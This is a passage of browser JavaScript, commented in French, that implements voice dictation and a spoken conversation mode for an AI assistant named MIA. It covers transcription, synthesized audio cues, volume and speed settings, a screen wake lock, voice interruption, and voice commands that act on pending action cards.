    const micBtn = document.getElementById('micBtn');
    if (!micBtn) return; // pas de clé OpenAI → bouton absent

    let recording = false;    // miroir de l'état du socle, pour les libellés
    let baseBefore = '';
    let baseAfter  = '';
    let finalText  = '';
    let deltaText  = '';

    function setMicLoading(on) {
        micBtn.classList.toggle('mic-loading', on);
        micBtn.title = on
            ? t('Connexion du micro…')
            : (recording ? t('Arrêter la dictée') : t('Dicter le message'));
    }

    function setMicUi(on) {
        recording = on;
        micBtn.classList.toggle('mic-recording', on);
        micBtn.title = on ? t('Arrêter la dictée') : t('Dicter le message');
        // Quand le micro n'enregistre plus, le texte dicté repasse entièrement
        // en normal (plus d'italique « en cours de dictée »).
        if (!on) {
            msgInput.classList.remove('mic-transcribed');
        }
    }

    function applyTranscript() {
        const inserted = (finalText + deltaText).replace(/\s+/g, ' ').trim();
        const sep = baseBefore && !/\s$/.test(baseBefore) && inserted ? ' ' : '';
        msgInput.value = baseBefore + sep + inserted + baseAfter;
        msgInput.classList.add('mic-transcribed');
        msgInput.dispatchEvent(new Event('input', { bubbles: true }));
    }

    function clearItalicOnUserEdit() {
        // Listener attaché une seule fois pour toute la durée de vie du bouton.
        if (clearItalicOnUserEdit._attached) return;
        clearItalicOnUserEdit._attached = true;
        msgInput.addEventListener('beforeinput', () => {
            msgInput.classList.remove('mic-transcribed');
        });
    }

    const transcriber = createRealtimeTranscriber({
        purpose: 'dictation',
        onState: ({ connecting, recording: on }) => {
            setMicUi(on);
            setMicLoading(connecting);
        },
        onStarted: () => {
            // Si le textarea n'a pas le focus (cas le plus courant — l'utilisateur
            // vient de cliquer sur le bouton micro), on append à la fin du
            // contenu existant. Sinon on respecte la position du curseur.
            const inTextarea = document.activeElement === msgInput;
            const insertStart = inTextarea
                ? (msgInput.selectionStart ?? msgInput.value.length)
                : msgInput.value.length;
            baseBefore = msgInput.value.slice(0, insertStart);
            baseAfter  = msgInput.value.slice(insertStart);
            finalText  = '';
            deltaText  = '';
            clearItalicOnUserEdit();
            msgInput.classList.add('mic-transcribed');
        },
        onDelta: (delta) => {
            deltaText += delta;
            applyTranscript();
        },
        onCompleted: (transcript) => {
            finalText += transcript;
            deltaText = '';
            applyTranscript();
        },
    });

    function stopRecording() { transcriber.stop(); }
    // Exclusion mutuelle avec la conversation vocale (un seul micro à la fois).
    window.stopDictation = stopRecording;

    micBtn.addEventListener('click', () => {
        if (transcriber.isConnecting()) return;   // connexion en cours : on ignore les clics
        if (transcriber.isRecording()) {
            stopRecording();
        } else {
            window.stopVoiceChat?.();
            transcriber.start();
        }
    });

    // Stoppe automatiquement la dictée dès qu'un message est envoyé.
    // Couvre les deux chemins d'envoi : clic sur "Envoyer" (#sendBtn) ET
    // submit clavier (Entrée). On utilise capture=true sur submit pour
    // garantir l'arrêt même si le handler du formulaire stop la propagation.
    sendBtn?.addEventListener('click', () => { if (transcriber.isRecording()) stopRecording(); });
    document.getElementById('chatForm')?.addEventListener(
        'submit',
        () => { if (transcriber.isRecording()) stopRecording(); },
        true
    );
})();

/* =========================================================
   Conversation vocale — écouter → envoyer → MIA répond → lire
   Chaque tour est un message ORDINAIRE (assistant, bases,
   connecteurs, quota : le pipeline du chat, rien de parallèle) ;
   seule la réponse est lue à voix haute — PENDANT qu'elle s'écrit,
   dès sa première phrase (POST /jobs/{id}/speak, cf. « Lecture en
   direct »). Repères sonores (WAV synthétisés ici, aucun fichier à servir) et
   annonces parlées des actions (GET /chat/voice/cue, audio en cache),
   tous joués par le MÊME élément audio, en file : jamais deux sons à
   la fois, jamais un son pendant que le micro attend un message.

   Ce que l'on DIT n'est pas toujours un message (reconnaissance :
   voice-commands.js, pure et testée) :
     - un ordre pour la carte en attente — « approuve », « envoie-le »,
       « plus court », « confirme » — actionne le MÊME code que le clic
       (runVoiceCardCommand), et MIA dit ce qui s'est passé ;
     - « stop » PENDANT la lecture fait taire MIA et lui rend l'écoute
       (interruption à la voix : le micro reste alors ouvert pendant
       qu'elle lit — réglage par appareil, cf. bargeIn) ;
     - « au revoir » termine la conversation.
   ========================================================= */
(() => {
    const btn = document.getElementById('voiceChatBtn');
    if (!btn) return; // réglage coupé ou clé OpenAI absente → bouton absent

    const bar       = document.getElementById('voiceChatBar');
    const barStatus = document.getElementById('voiceChatStatus');
    const barLive   = document.getElementById('voiceChatLive');
    const barSkip   = document.getElementById('voiceChatSkip');
    const barEnd    = document.getElementById('voiceChatEnd');
    const volWrap   = document.getElementById('voiceChatVolumeWrap');
    const volInput  = document.getElementById('voiceChatVolume');
    const lengthSel = document.getElementById('voiceChatLength');
    const bargeBtn  = document.getElementById('voiceChatBargeIn');

    // Reconnaissance des ordres dits à voix haute (voice-commands.js). Absente
    // (script non chargé) : la conversation marche comme avant — tout ce qui
    // est dit est un message, et rien n'interrompt la lecture à la voix.
    const VC = window.MiaVoiceCommands || null;

    // off | connecting | listening | sending | thinking | speaking | acting
    // (acting : un ordre dit à voix haute s'exécute sur une carte en attente)
    let mode = 'off';
    let turnText   = '';    // transcription du tour en cours
    let turnConvId = null;  // fil du tour envoyé : les évènements des autres fils sont ignorés
    let turnSeq    = 0;     // numéro de tour : un son ou une annonce d'un tour passé ne joue jamais
    let speakSeq   = 0;     // numéro de lecture : une lecture périmée ne rend jamais la main
    let speakAbort = null;  // téléchargements audio en cours
    let playResolve = null; // résout la lecture en cours (fin naturelle, Passer, Terminer)
    let bargeMicOpen  = false; // micro ouvert PENDANT la lecture : à relâcher avant de redonner la parole
    // Réponse du tour, lue PENDANT qu'elle s'écrit (cf. « Lecture en direct ») :
    let turnJobId   = null;  // sa génération — ses évènements, et eux seuls, pilotent la lecture
    let turnStream  = null;  // état de son flux (le texte déjà écrit sert à reconnaître un écho)
    let turnOutcome = null;  // comment elle s'est terminée (mia:chat-turn-ended), null tant qu'elle s'écrit
    let readerDone  = true;  // la lecture est finie, ou n'a jamais commencé
    let readerSpoke = false; // MIA a commencé à la lire à voix haute
    let liveWaiting = false; // la lecture attend la suite du texte (les tics reprennent)

    // UN SEUL élément audio, débloqué au clic (geste utilisateur) par un WAV
    // muet : iOS refuse un play() lancé plus tard hors geste, sauf sur un
    // élément qui a déjà joué dans un geste.
    const player = new Audio();
    player.preload = 'auto';
    const SILENT_WAV = 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEAQB8AAIA+AAACABAAZGF0YQAAAAA=';
    function unlockAudio() {
        try {
            player.src = SILENT_WAV;
            const p = player.play();
            if (p && typeof p.catch === 'function') p.catch(() => {});
        } catch (_) {}
    }

    // ---- Volume ----------------------------------------------------------
    // Réglé par un curseur, mémorisé par compte (navigateur partagé). Sur
    // iOS, `volume` est en LECTURE SEULE (toujours 1) : le curseur n'y
    // servirait à rien, il est masqué — ce sont les boutons de l'appareil
    // qui règlent, et la voix passe par le haut-parleur parce que le micro
    // est RELÂCHÉ pendant la lecture (cf. releaseMic). Le curseur vaut pour
    // tous les sons : voix, repères, annonces (un seul élément).
    const VOICE_PREFS_KEY = 'voicePrefs:' + (window.CURRENT_USER_ID ?? 'anon');
    function readVoicePrefs() {
        try { return JSON.parse(localStorage.getItem(VOICE_PREFS_KEY) || '{}') || {}; } catch (_) { return {}; }
    }
    function writeVoicePrefs(patch) {
        try { localStorage.setItem(VOICE_PREFS_KEY, JSON.stringify(Object.assign(readVoicePrefs(), patch))); } catch (_) {}
    }
    function volumeIsWritable() {
        try {
            player.volume = 0.5;
            const ok = Math.abs(player.volume - 0.5) < 0.01;
            player.volume = 1;
            return ok;
        } catch (_) { return false; }
    }
    function applyVolume(percent) {
        const level = Math.min(100, Math.max(0, Math.round(Number(percent) || 0)));
        try { player.volume = level / 100; } catch (_) {}
        if (volInput && String(volInput.value) !== String(level)) volInput.value = String(level);
        return level;
    }
    if (volWrap && volInput) {
        if (!volumeIsWritable()) {
            volWrap.hidden = true;
        } else {
            const saved = Number(readVoicePrefs().volume);
            applyVolume(Number.isFinite(saved) ? saved : 100);
            volInput.addEventListener('input', () => applyVolume(volInput.value));
            volInput.addEventListener('change', () => writeVoicePrefs({ volume: applyVolume(volInput.value) }));
        }
    }

    // ---- Vitesse de lecture et longueur des réponses ---------------------
    // Deux réglages du COMPTE (users.voice_rate / voice_length), servis par le
    // gabarit et modifiables ici comme dans Réglages → Préférences IA : une
    // seule source, écrite par POST /settings/voice.
    //
    // La vitesse est appliquée par le lecteur (playbackRate) : rien n'est
    // re-synthétisé, donc rien n'est refacturé, et les annonces déjà en cache
    // restent valables. La longueur, elle, est une consigne que le SERVEUR
    // relit à chaque envoi — le front ne fait que l'afficher et l'écrire.
    const voicePrefs  = window.VOICE_PREFS || {};
    let voiceRate     = Number(voicePrefs.rate) > 0 ? Number(voicePrefs.rate) : 100;
    let voiceLength   = String(voicePrefs.length || '');

    function applyRate(player_, rate) {
        const value = Math.max(0.25, Math.min(4, (Number(rate) || 100) / 100));
        try {
            // `preservesPitch` garde la voix naturelle à vitesse élevée ; les
            // variantes préfixées couvrent les moteurs plus anciens.
            player_.preservesPitch = true;
            player_.mozPreservesPitch = true;
            player_.webkitPreservesPitch = true;
        } catch (_) {}
        try { player_.playbackRate = value; } catch (_) {}
    }

    // Le sélecteur n'écrit JAMAIS un état non enregistré : la liste revient à
    // la valeur que le serveur confirme (même règle que le sélecteur de bases
    // du composer), et reste figée le temps de l'aller-retour.
    if (lengthSel) {
        if (voiceLength) lengthSel.value = voiceLength;
        voiceLength = lengthSel.value;
        lengthSel.addEventListener('change', async () => {
            const wanted   = lengthSel.value;
            const previous = voiceLength;
            lengthSel.disabled = true;
            try {
                const fd = new FormData();
                fd.append('length', wanted);
                const r = await fetchWithSessionGuard('/settings/voice', {
                    method: 'POST', headers: { 'X-CSRF-Token': csrfToken }, body: fd,
                });
                const data = await r.json().catch(() => ({}));
                if (!r.ok || !data.ok) throw new Error(data.error || t('HTTP {code}', { code: r.status }));
                voiceLength = String(data.length || wanted);
            } catch (e) {
                if (!(e && e.message === 'SESSION_EXPIRED')) {
                    showToast(t('Longueur des réponses non enregistrée : {raison}', { raison: e && e.message ? e.message : '' }), 'warning');
                }
                voiceLength = previous;
            } finally {
                lengthSel.value = voiceLength;
                lengthSel.disabled = false;
            }
        });
    }

    // Le bandeau vit DANS le formulaire du chat : une touche Entrée sur une de
    // ses commandes y déclencherait la soumission implicite du formulaire,
    // donc l'envoi du message en cours de frappe. On confisque cette touche-là
    // sur les deux commandes, sans rien changer au reste du clavier (flèches,
    // Échap, Tab continuent de piloter la liste).
    [lengthSel, volInput].forEach((commande) => {
        commande?.addEventListener('keydown', (ev) => {
            if (ev.key === 'Enter') ev.preventDefault();
        });
    });

    // ---- Interruption à la voix -----------------------------------------
    // Pendant que MIA lit sa réponse, dire « stop » (« arrête », « tais-toi »,
    // « attends »…) la fait taire et lui rend l'écoute. Cela suppose le micro
    // OUVERT pendant la lecture, et ce n'est pas gratuit :
    //  - les minutes de lecture deviennent aussi des minutes d'écoute ;
    //  - sur iPhone et iPad, une capture ouverte garde la session audio du
    //    système en mode « appel » : la voix de MIA y est moins forte, et les
    //    boutons de volume règlent alors le volume d'appel (cf. releaseMic).
    // D'où un réglage PAR APPAREIL (même mémoire que le volume), actif par
    // défaut partout sauf sur iOS, où le choix entre « interrompre à la voix »
    // et « entendre MIA à plein volume » revient à l'utilisateur. « Passer »
    // reste là dans les deux cas.
    const IS_IOS = /iP(hone|ad|od)/.test(navigator.userAgent || '')
        || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
    let bargeIn = (() => {
        if (!VC) return false;
        const saved = readVoicePrefs().bargeIn;
        return typeof saved === 'boolean' ? saved : !IS_IOS;
    })();
    function paintBargeIn() {
        if (!bargeBtn) return;
        bargeBtn.setAttribute('aria-pressed', bargeIn ? 'true' : 'false');
        bargeBtn.classList.toggle('is-on', bargeIn);
        bargeBtn.title = (bargeIn
            ? t('Interruption à la voix activée : pendant que MIA lit, dites « stop ». Le micro reste ouvert pendant la lecture.')
            : t('Interruption à la voix désactivée : le micro est coupé pendant que MIA lit.'))
            + (IS_IOS ? ' ' + t('Sur iPhone et iPad, la voix de MIA est moins forte tant que le micro est ouvert.') : '');
    }
    if (bargeBtn) {
        if (!VC) bargeBtn.hidden = true;
        paintBargeIn();
        bargeBtn.addEventListener('click', () => {
            bargeIn = !bargeIn;
            writeVoicePrefs({ bargeIn });
            paintBargeIn();
            syncBargeMic(); // le réglage peut basculer en pleine lecture
            // L'infobulle ne s'affiche pas au doigt : le nouvel état se dit aussi
            // en toutes lettres — avec, sur iOS, ce qu'il coûte à la voix.
            showToast(bargeBtn.title, 'info');
        });
    }

    // ---- Repères sonores -------------------------------------------------
    // Synthétisés en WAV (16 bits mono, 22 050 Hz) au premier usage, joués
    // comme n'importe quel audio : aucun fichier à servir, et le volume du
    // curseur s'applique. Trois repères, trois sens : « envoyé » (deux notes
    // montantes), « je vous écoute » (une note claire), « MIA travaille »
    // (un tic grave et discret, répété tant que la réponse se prépare, et
    // seulement quand rien d'autre ne joue).
    function synthWav(notes, gain) {
        const rate  = 22050;
        const total = notes.reduce((n, note) => n + Math.round(rate * note.ms / 1000), 0);
        const pcm   = new Int16Array(total);
        let i = 0;
        for (const note of notes) {
            const len  = Math.round(rate * note.ms / 1000);
            const fade = Math.max(1, Math.min(Math.floor(len / 2), Math.round(rate * 0.008)));
            for (let k = 0; k < len; k++, i++) {
                const env = Math.min(1, k / fade, (len - 1 - k) / fade);
                pcm[i] = Math.round(32767 * gain * env * Math.sin(2 * Math.PI * note.f * k / rate));
            }
        }
        const buf  = new ArrayBuffer(44 + pcm.length * 2);
        const view = new DataView(buf);
        const tag  = (offset, s) => { for (let k = 0; k < s.length; k++) view.setUint8(offset + k, s.charCodeAt(k)); };
        tag(0, 'RIFF'); view.setUint32(4, 36 + pcm.length * 2, true); tag(8, 'WAVE');
        tag(12, 'fmt '); view.setUint32(16, 16, true); view.setUint16(20, 1, true); view.setUint16(22, 1, true);
        view.setUint32(24, rate, true); view.setUint32(28, rate * 2, true); view.setUint16(32, 2, true); view.setUint16(34, 16, true);
        tag(36, 'data'); view.setUint32(40, pcm.length * 2, true);
        new Int16Array(buf, 44).set(pcm);
        return URL.createObjectURL(new Blob([buf], { type: 'audio/wav' }));
    }
    const EARCON_SPECS = {
        sent:   { notes: [{ f: 523.25, ms: 90 }, { f: 783.99, ms: 150 }], gain: 0.28 },
        listen: { notes: [{ f: 880, ms: 110 }], gain: 0.22 },
        tick:   { notes: [{ f: 392, ms: 55 }], gain: 0.13 },
    };
    const earconUrls = {};
    function earcon(name) {
        if (!earconUrls[name]) {
            try { earconUrls[name] = synthWav(EARCON_SPECS[name].notes, EARCON_SPECS[name].gain); } catch (_) { return null; }
        }
        return earconUrls[name];
    }

    // ---- File audio ------------------------------------------------------
    // Un seul son à la fois : chaque son attend le précédent, et un garde
    // (tour courant, état) décide au moment de jouer — un repère d'un tour
    // déjà terminé est simplement sauté. `busy` dit si un son joue (les tics
    // se taisent pendant une annonce).
    let chain = Promise.resolve();
    let busy  = 0;
    // `rate` vaut 100 par défaut : un repère sonore ne s'accélère JAMAIS avec
    // la voix — à 2×, un bip devient un clic, et il ne veut plus rien dire.
    // Seules la voix et les annonces suivent la vitesse choisie.
    function enqueueAudio(url, guard, rate) {
        const run = chain.then(async () => {
            if (!url || !guard()) return;
            busy++;
            try { await play(url, rate); } catch (_) {} finally { busy--; }
        });
        chain = run.catch(() => {});
        return run;
    }
    function drainAudio() { return chain; }

    // La réponse se fait attendre : MIA réfléchit, ou elle a lu ce qui était
    // écrit et la suite s'écrit encore (un outil travaille, par exemple).
    function awaitingReply() {
        return mode === 'thinking' || (mode === 'speaking' && liveWaiting);
    }
    // La réponse du tour occupe la parole : elle se prépare, ou MIA la lit.
    function replyAlive(seq) {
        return (mode === 'thinking' || mode === 'speaking') && seq === turnSeq;
    }

    // Tics « MIA travaille » : toutes les TICK_MS tant que la réponse se fait
    // attendre, jamais par-dessus la voix, une annonce ou un autre repère.
    const TICK_MS = 2800;
    let tickTimer = null;
    function startTicks() {
        stopTicks();
        const seq = turnSeq;
        tickTimer = setInterval(() => {
            if (!replyAlive(seq)) { stopTicks(); return; }
            if (busy > 0 || !awaitingReply()) return;
            enqueueAudio(earcon('tick'), () => awaitingReply() && seq === turnSeq);
        }, TICK_MS);
    }
    function stopTicks() { clearInterval(tickTimer); tickTimer = null; }

    // ---- Annonces parlées des actions -----------------------------------
    // Chaque action tracée pendant la réponse (recherche Internet, bases de
    // connaissances, cerveau MyBrain, connecteurs…) est dite à voix haute :
    // le serveur rend l'audio du libellé de la trace (GET /chat/voice/cue),
    // mis en cache là-bas après la première synthèse et ici pour la page.
    // Une action par type et par tour, quatre au plus (une longue chaîne
    // d'outils ne doit pas devenir une litanie) ; une action en échec ne
    // s'annonce pas (la réponse l'expliquera). Une action menée alors que MIA
    // a déjà commencé à lire s'annonce entre deux passages de sa voix : la
    // file audio ne joue jamais deux sons à la fois.
    const MAX_CUES_PER_TURN = 4;
    const cueCache = new Map(); // type → Promise<string|null> (URL blob:)
    let announced = new Set();
    function cueUrl(type) {
        if (cueCache.has(type)) return cueCache.get(type);
        const lang = (window.I18N && window.I18N.lang) || document.documentElement.lang || 'fr';
        const promise = (async () => {
            const r = await fetchWithSessionGuard(
                '/chat/voice/cue?type=' + encodeURIComponent(type) + '&lang=' + encodeURIComponent(lang),
                { method: 'GET' }
            );
            // Rien à dire (204), fonction coupée (403), quota (429) : définitif pour la page.
            if (r.status === 204 || r.status === 403 || r.status === 429) return null;
            if (!r.ok) throw new Error('cue HTTP ' + r.status);
            return URL.createObjectURL(await r.blob());
        })().catch((e) => {
            cueCache.delete(type); // un incident passager ne mute pas les annonces pour toute la page
            console.warn('[voice] cue unavailable', type, e && e.message);
            return null;
        });
        cueCache.set(type, promise);
        return promise;
    }
    // Les annonces les plus probables sont chargées dès le début de la
    // conversation : la première du tour joue sans attendre un aller-retour.
    const CUE_PREFETCH = ['web_search', 'searching_knowledge_bases', 'mybrain_search'];

    document.addEventListener('mia:chat-action', (ev) => {
        const d = ev.detail || {};
        const seq = turnSeq;
        if (!replyAlive(seq) || !isTurnEvent(d)) return;
        const action = d.action || {};
        const type = String(action.t || '');
        if (!type || action.ok === false) return;
        if (announced.has(type) || announced.size >= MAX_CUES_PER_TURN) return;
        announced.add(type);
        cueUrl(type).then((url) => {
            if (!url || !replyAlive(seq)) return;
            enqueueAudio(url, () => replyAlive(seq), voiceRate);
        });
    });

    // ---- Écran maintenu allumé -------------------------------------------
    // Sur un téléphone, une conversation vocale est faite de silences : MIA
    // réfléchit, MIA parle, on l'écoute sans toucher l'écran. Passé le délai
    // de mise en veille, l'appareil éteignait l'écran, le système suspendait
    // la page, et la conversation se coupait net. Un verrou d'écran (Screen
    // Wake Lock) est donc demandé tant que la conversation tourne — et rendu
    // dès qu'elle se termine : hors de ce mode, l'écran s'éteint comme
    // d'habitude (la dictée, courte et les yeux sur le champ, n'en a pas
    // besoin). Le navigateur relâche le verrou de lui-même quand la page est
    // masquée (autre application, écran verrouillé à la main) : il est
    // redemandé au retour si la conversation tourne encore. Verrou
    // indisponible (navigateur ancien, page non sécurisée) ou refusé
    // (économiseur de batterie) : la conversation marche, l'écran suit le
    // délai de l'appareil — jamais une erreur, une ligne en console.
    let wakeLock        = null;  // verrou en cours (WakeLockSentinel)
    let wakeLockWanted  = false; // vrai tant que la conversation tourne
    let wakeLockPending = false; // demande en cours : jamais deux à la fois
    let wakeLockNoted   = false; // indisponibilité signalée une fois par page

    function dropWakeLock(sentinel) {
        try {
            const p = sentinel.release();
            if (p && typeof p.catch === 'function') p.catch(() => {});
        } catch (_) {}
    }
    async function acquireWakeLock() {
        if (!wakeLockWanted || wakeLock || wakeLockPending || document.hidden) return;
        if (!navigator.wakeLock || typeof navigator.wakeLock.request !== 'function') {
            if (!wakeLockNoted) console.info('[voice] wake lock unavailable: the screen follows the device sleep delay');
            wakeLockNoted = true;
            return;
        }
        wakeLockPending = true;
        try {
            const sentinel = await navigator.wakeLock.request('screen');
            if (!wakeLockWanted) { dropWakeLock(sentinel); return; } // conversation finie pendant la demande
            wakeLock = sentinel;
            // Relâché par le navigateur (page masquée) : on le sait, et le
            // retour au premier plan le redemande.
            sentinel.addEventListener('release', () => { if (wakeLock === sentinel) wakeLock = null; });
        } catch (e) {
            console.warn('[voice] wake lock refused', e && e.message);
        } finally {
            wakeLockPending = false;
        }
    }
    function keepScreenAwake(on) {
        if (on) {
            if (wakeLockWanted) return;
            wakeLockWanted = true;
            acquireWakeLock();
            return;
        }
        wakeLockWanted = false;
        const sentinel = wakeLock;
        wakeLock = null;
        if (sentinel) dropWakeLock(sentinel);
    }
    document.addEventListener('visibilitychange', () => { if (!document.hidden) acquireWakeLock(); });

    // ---- État ------------------------------------------------------------
    function setLive(text) { if (barLive) barLive.textContent = text; }

    function setMode(next, statusText) {
        mode = next;
        const on = next !== 'off';
        voiceModeActive = on;
        keepScreenAwake(on); // l'écran reste allumé tant que la conversation tourne, et seulement alors
        // Les cartes en attente affichent alors ce qui peut se DIRE (voiceHintHtml).
        document.body.classList.toggle('voice-chat-on', on);
        btn.classList.toggle('voice-on', on);
        btn.classList.toggle('voice-connecting', next === 'connecting');
        btn.classList.toggle('voice-listening', next === 'listening');
        btn.setAttribute('aria-pressed', on ? 'true' : 'false');
        btn.title = on ? t('Terminer la conversation vocale') : t('Converser à la voix');
        if (bar) {
            bar.hidden = !on;
            bar.classList.toggle('is-listening', next === 'listening');
            bar.classList.toggle('is-thinking', next === 'sending' || next === 'thinking' || next === 'acting');
            bar.classList.toggle('is-speaking', next === 'speaking');
            if (barStatus) barStatus.textContent = statusText || '';
            if (barSkip) barSkip.hidden = next !== 'speaking';
        }
        if (next !== 'listening') setLive('');
    }

    // ---- Tours de parole -------------------------------------------------
    // Chaque phrase entendue porte l'identifiant de son tour ; on note dans
    // quel état elle a COMMENCÉ. Une phrase commencée pendant que MIA lisait
    // n'est JAMAIS un message : c'est un ordre d'arrêt, ou rien (la voix de
    // MIA revenue par le micro, une remarque à un voisin) — y compris si elle
    // s'achève après la fin de la lecture. Sans cette règle, la dernière
    // phrase d'une réponse lue pourrait repartir comme la question suivante :
    // MIA se répondrait à elle-même.
    const itemOrigin = new Map(); // tour → 'speaking' | 'other'
    function originOf(itemId) {
        const now = mode === 'speaking' ? 'speaking' : 'other';
        if (!itemId) return now;
        if (!itemOrigin.has(itemId)) {
            if (itemOrigin.size >= 200) itemOrigin.delete(itemOrigin.keys().next().value);
            itemOrigin.set(itemId, now);
        }
        return itemOrigin.get(itemId);
    }

    const transcriber = createRealtimeTranscriber({
        purpose: 'conversation',
        silenceMessage: t('Conversation vocale : aucun son reçu. Vérifiez que le micro capte du son.'),
        // Pendant la lecture, le micro n'est ouvert que pour un éventuel
        // « stop » : le silence de l'utilisateur y est normal.
        expectsSpeech: () => mode === 'listening',
        onFatal: (message, payload) => showLlmErrorToast(payload, message, t('Conversation vocale impossible')),
        onStarted: () => startListening(),
        onSpeechStart: (itemId) => {
            if (originOf(itemId) === 'speaking') return;
            if (mode === 'listening' && !turnText) setLive('…');
        },
        onDelta: (delta, itemId) => {
            if (originOf(itemId) === 'speaking' || mode !== 'listening') return;
            turnText += delta;
            setLive(turnText);
        },
        onCompleted: (transcript, itemId) => {
            if (originOf(itemId) === 'speaking') {
                if (mode === 'speaking') hearWhileSpeaking(transcript);
                return;
            }
            if (mode !== 'listening') return;
            // Le tour est validé par la détection de tour SERVEUR : le texte
            // complet remplace les fragments reçus en cours de route.
            if (transcript) turnText = transcript;
            endTurn();
        },
        onStopped: () => { if (mode !== 'off') endConversation(); },
    });

    /** Remet à zéro ce qui appartient à UN tour ; rend son numéro. */
    function newTurn() {
        turnText = '';
        speakAbort?.abort();
        speakAbort = null;
        stopTicks();
        announced = new Set();
        turnOutcome = null;
        readerDone  = true;
        readerSpoke = false;
        liveWaiting = false;
        return ++turnSeq;
    }

    // Nouveau tour d'écoute : le repère « je vous écoute » joue d'abord, le
    // micro n'est repris qu'ensuite — un son joué micro ouvert repasserait
    // dans la transcription. Un micro resté ouvert pendant la lecture
    // (interruption à la voix) est donc relâché AVANT le repère.
    async function startListening() {
        if (mode === 'off') return;
        if (bargeMicOpen) {
            bargeMicOpen = false;
            transcriber.releaseMic();
        }
        const seq = newTurn();
        setMode('listening', t('Je vous écoute'));
        setLive(''); // l'invite « dites stop » de la lecture ne vaut plus : place à la transcription
        prefetchCardCues();
        await enqueueAudio(earcon('listen'), () => mode === 'listening' && seq === turnSeq);
        if (mode !== 'listening' || seq !== turnSeq) return;
        transcriber.attachMic();
    }

    // Fin de tour : la phrase est d'abord ROUTÉE — ce qui a été dit n'est pas
    // toujours un message. Rien de reconnu (ordre d'arrêt dit alors que MIA
    // ne lit plus) : on continue d'écouter, sans rien envoyer.
    function endTurn() {
        const text = turnText.replace(/\s+/g, ' ').trim();
        turnText = '';
        if (!text) { setLive(''); return; } // faux tour (bruit) : on continue d'écouter
        if (!routeTurn(text)) setLive('');
    }

    /**
     * Décide de ce qu'une phrase DÉCLENCHE, dans cet ordre :
     *  1. un ordre pour la carte en attente (« approuve », « envoie-le ») ;
     *  2. la fin de la conversation (« au revoir ») ;
     *  3. un ordre d'arrêt seul, alors que rien n'est lu : ni action, ni
     *     message — « stop » n'a rien à dire à l'assistant (rend false) ;
     *  4. sinon, un message ordinaire.
     */
    function routeTurn(text) {
        if (VC) {
            const order = cardOrder(text);
            if (order) { actOnCard(order.card, order.cmd); return true; }
            if (VC.endCommand(text)) { farewell(); return true; }
            const stop = VC.stopCommand(text);
            if (stop && stop.hard && !stop.remainder) return false;
        }
        sendTurn(text);
        return true;
    }

    // Message ordinaire : le micro est RELÂCHÉ avant l'envoi (la réponse lue
    // ne doit pas repasser dans le micro, et iOS ne rend le haut-parleur
    // qu'une fois la capture fermée), le repère « envoyé » confirme que la
    // demande est partie, puis la transcription part par submitForm —
    // création de la conversation, pièces jointes, outil engagé, bases
    // cochées : rien n'est recopié.
    async function sendTurn(text) {
        transcriber.releaseMic();
        setMode('sending', t('Envoi…'));
        const seq = turnSeq;
        enqueueAudio(earcon('sent'), () => (mode === 'sending' || mode === 'thinking') && seq === turnSeq);
        await previousReplySettled();
        if (mode !== 'sending' || seq !== turnSeq) return;
        msgInput.value = text;
        msgInput.dispatchEvent(new Event('input', { bubbles: true }));
        submitTurn();
    }

    // Une réponse interrompue en pleine écriture (« stop », Passer) met un
    // instant à s'arrêter côté serveur : la question suivante attend qu'elle
    // soit close — deux réponses ne s'écrivent jamais en même temps dans la
    // même conversation. Au-delà de quinze secondes, on n'attend plus.
    function previousReplySettled() {
        const deadline = Date.now() + 15000;
        return new Promise((resolve) => {
            const check = () => {
                if (!turnStream || turnStream.done || Date.now() > deadline) { resolve(); return; }
                setTimeout(check, 150);
            };
            check();
        });
    }

    // ---- Ordres pour la carte en attente ---------------------------------
    // La carte visée est la plus récente encore en attente dans le fil
    // affiché. La décision (voice-commands.js) ne voit que la phrase et ce
    // que la carte dit d'elle-même : jamais le contenu d'un email ni d'un
    // document — rien de ce qu'un tiers a écrit ne peut « approuver ».
    function cardOrder(text) {
        const cards = pendingActionCards();
        if (!cards.length) return null;
        const card = cards[cards.length - 1];
        const cmd = VC.cardCommand(text, voiceCardContext(card));
        return cmd ? { card, cmd } : null;
    }

    // Annonce parlée d'une issue (phrase courte, en cache comme les annonces
    // d'actions) : elle attend son tour dans la file, et se tait si la
    // conversation est passée à autre chose.
    async function sayCue(type, alive) {
        const url = await cueUrl(type);
        if (url && alive()) await enqueueAudio(url, alive, voiceRate);
    }

    // Annonces probables pour la carte en attente, chargées à l'avance : la
    // réponse à « envoie » ne doit pas attendre une synthèse.
    function prefetchCardCues() {
        if (!VC) return;
        const cards = pendingActionCards();
        if (!cards.length) return;
        const isMail = cards[cards.length - 1].classList.contains('mail-draft-card');
        (isMail
            ? ['vc_send_confirm', 'vc_sent', 'vc_draft', 'vc_improving', 'vc_improved', 'vc_cancelled']
            : ['vc_done', 'vc_cancelled', 'vc_say_approve']
        ).forEach((type) => { cueUrl(type); });
    }

    // L'ordre s'exécute par le code du CLIC (runVoiceCardCommand) ; les deux
    // notes « envoyé » accusent réception tout de suite, puis MIA dit l'issue
    // — « Email envoyé », « C'est annulé », « L'envoi est définitif… » — et
    // écoute de nouveau.
    async function actOnCard(card, cmd) {
        transcriber.releaseMic();
        const seq = turnSeq;
        const alive = () => mode === 'acting' && seq === turnSeq;
        setMode('acting', t('Je m\'en occupe…'));
        enqueueAudio(earcon('sent'), alive);
        let cues = [];
        try {
            cues = await runVoiceCardCommand(card, cmd, (type) => { sayCue(type, alive); });
        } catch (e) {
            console.error('[voice] card command failed', e);
            cues = ['vc_failed'];
        }
        for (const type of cues) {
            if (!alive()) return;
            await sayCue(type, alive);
        }
        if (alive()) startListening();
    }

    // « Au revoir » : MIA salue, puis la conversation se termine.
    async function farewell() {
        transcriber.releaseMic();
        const seq = turnSeq;
        const alive = () => mode === 'acting' && seq === turnSeq;
        setMode('acting', t('À bientôt'));
        await sayCue('vc_bye', alive);
        if (alive()) endConversation();
    }

    // ---- Interruption à la voix ------------------------------------------
    /** Texte de la réponse en cours de lecture (référence pour reconnaître un écho). */
    function spokenText() {
        return (turnStream && turnStream.rawText) || '';
    }

    // Micro ouvert ou non pendant la lecture, selon le réglage DU MOMENT.
    function syncBargeMic() {
        if (mode !== 'speaking') return;
        if (bargeIn && !bargeMicOpen) {
            bargeMicOpen = true;
            transcriber.attachMic();
            setLive(t('Dites « stop » pour l\'interrompre'));
        } else if (!bargeIn && bargeMicOpen) {
            bargeMicOpen = false;
            transcriber.releaseMic();
            setLive('');
        }
    }

